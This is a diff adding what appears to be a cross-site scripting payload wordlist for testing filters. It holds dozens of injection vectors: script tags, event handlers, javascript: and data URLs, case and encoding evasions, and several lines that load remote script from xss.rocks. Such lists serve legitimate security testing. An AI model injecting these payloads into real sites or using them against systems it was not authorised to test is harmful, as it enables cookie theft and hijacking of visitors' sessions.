@@ -1,0 +1,61 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(document.cookie)>
+<svg onload=alert(1)>
+<svg onload=alert('XSS')>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<iframe src="javascript:alert('XSS')">
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<div onmouseover=alert(1)>test</div>
+<a href="javascript:alert(1)">click</a>
+<form action="javascript:alert(1)"><button>click</button></form>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<svg/onload=alert(1)>
+<img/src=x/onerror=alert(1)>
+<iframe/src=javascript:alert(1)>
+<script>alert`1`</script>
+<img src=x onerror="alert(1)">
+<img src=x onerror='alert(1)'>
+<svg><script>alert(1)</script></svg>
+<math><mi//xlink:href="data:x,<script>alert(1)</script>">
+<TABLE><TD BACKGROUND="javascript:alert(1)">
+<DIV STYLE="background-image: url(javascript:alert(1))">
+<IMG SRC="javascript:alert(1);">
+<IMG DYNSRC="javascript:alert(1)">
+<IMG LOWSRC="javascript:alert(1)">
+<BGSOUND SRC="javascript:alert(1);">
+<BR SIZE="&{alert(1)}">
+<LAYER SRC="http://xss.rocks/xss.js"></LAYER>
+<LINK REL="stylesheet" HREF="javascript:alert(1);">
+<IMG SRC='vbscript:msgbox("XSS")'>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1);">
+<IFRAME SRC="javascript:alert(1);"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert(1);"></FRAMESET>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==">
+<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<XSS STYLE="xss:expression(alert('XSS'))">
+<STYLE TYPE="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+<BASE HREF="javascript:alert('XSS');//">
+<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://xss.rocks/xss.htc"><xss:xss>XSS</xss:xss></HTML>
